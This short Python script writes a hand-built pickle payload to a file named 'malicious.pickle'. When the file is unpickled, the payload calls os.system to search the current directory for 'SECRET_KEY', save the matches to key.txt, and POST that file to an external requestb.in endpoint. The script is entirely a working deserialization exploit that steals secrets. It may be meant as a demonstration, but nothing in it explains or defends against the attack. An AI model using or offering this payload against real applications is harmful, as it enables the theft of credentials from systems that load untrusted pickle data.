import pickle

with open('malicious.pickle', 'w') as pickle_file:
	malicious_string = "cos\nsystem\n(S'grep -rnw '.' -e 'SECRET_KEY' > key.txt; curl -X POST -d @key.txt https://requestb.in/16frcjp1'\ntR."
	pickle_file.write(malicious_string)
